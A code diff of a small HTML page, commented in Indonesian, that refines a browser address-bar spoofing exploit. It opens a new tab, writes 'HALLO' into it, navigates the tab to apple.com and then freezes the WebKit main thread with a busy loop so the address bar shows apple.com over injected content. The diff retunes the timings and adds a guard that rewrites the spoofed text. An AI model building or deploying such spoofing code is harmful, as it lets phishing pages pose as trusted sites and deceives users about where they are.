@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Ultimate Force Lock - HALLO</title>
+    <title>Persistent Lock - HALLO</title>
     <style>
       body, html {
         margin: 0;
@@ -29,15 +29,15 @@
       button {
         width: 100%;
         max-width: 400px;
-        padding: 20px;
+        padding: 22px;
         font-size: 18px;
         font-weight: bold;
-        background: #ff3b30;
+        background: #007aff;
         color: #fff;
         border: none;
         border-radius: 16px;
         cursor: pointer;
-        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.4);
+        box-shadow: 0 8px 24px rgba(0, 122, 255, 0.4);
       }
       button:active {
         transform: scale(0.96);
@@ -46,18 +46,18 @@
   </head>
   <body>
     <div class="container">
-      <button id="startBtn">FORCE LOCK TO APPLE.COM</button>
+      <button id="startBtn">CLICK TO LOCK APPLE.COM</button>
     </div>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // Membuka tab baru secara instan
+        // 1. Membuka tab baru secara bersih (Bypass about:blank via window.open kosong)
         const newTab = window.open("", "_blank");
 
         if (newTab) {
-          // Menyuntikkan halaman super simpel berisi teks "HALLO" sesuai permintaan
+          // 2. Menyuntikkan dokumen awal dengan tulisan "HALLO"
           newTab.document.write(`
             <!DOCTYPE html>
             <html>
@@ -66,7 +66,7 @@
               <meta name="viewport" content="width=device-width, initial-scale=1">
             </head>
             <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-              <h1 style="font-size:80px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
+              <h1 id="spoof-text" style="font-size:90px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
             </body>
             </html>
           `);
@@ -74,29 +74,36 @@
 
           try { newTab.focus(); } catch (e) {}
 
-          // TIMING KUNCI 1 (Sangat Cepat - 5ms): Memaksa location.href ditarik langsung ke apple.com
+          // 3. Timing Tarikan Navigasi (10ms): Menarik alamat browser ke apple.com agar address bar berubah
           setTimeout(() => {
             try {
               newTab.location.href = "https://apple.com";
             } catch (err) {}
-          }, 5);
+          }, 10);
 
-          // TIMING KUNCI 2 (25ms): Menembak dan membekukan render thread tepat saat UI memperbarui address bar
+          // 4. Timing Penguncian Agresif (30ms): Mengunci main thread dan memaksa dokumen tetap "HALLO"
           setTimeout(() => {
             try {
               newTab.eval(`
-                const start = Date.now();
-                while (Date.now() - start < 5000) {
-                  // Memaksa kalkulasi layout sinkronus berulang-ulang untuk mengunci event loop WebKit secara total
-                  const forceReflow = document.body.offsetHeight;
-                  document.body.style.backgroundColor = (forceReflow % 2 === 0) ? '#ffffff' : '#fcfcfc';
+                const startTime = Date.now();
+                // Membekukan thread selama 6 detik penuh untuk mengamankan state desynchronization
+                while (Date.now() - startTime < 6000) {
+                  // Memaksa kalkulasi layout reflow agar WebKit tidak sempat memproses render jaringan luar
+                  const reflow = document.body.offsetHeight;
+                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fcfcfc';
+
+                  // Proteksi tambahan: Jika elemen hilang atau tertimpa, paksa tulis ulang teks "HALLO" secara instan
+                  if (!document.getElementById('spoof-text')) {
+                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:90px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
+                  }
                 }
               `);
             } catch (e) {
-              // Fallback lokal jika context terisolasi ketat
-              let s = Date.now(); while(Date.now() - s < 5000) {}
+              // Fallback lokal jika terhalang cross-origin policy
+              let start = Date.now();
+              while (Date.now() - start < 6000) {}
             }
-          }, 25);
+          }, 30);
         }
       };
     </script>
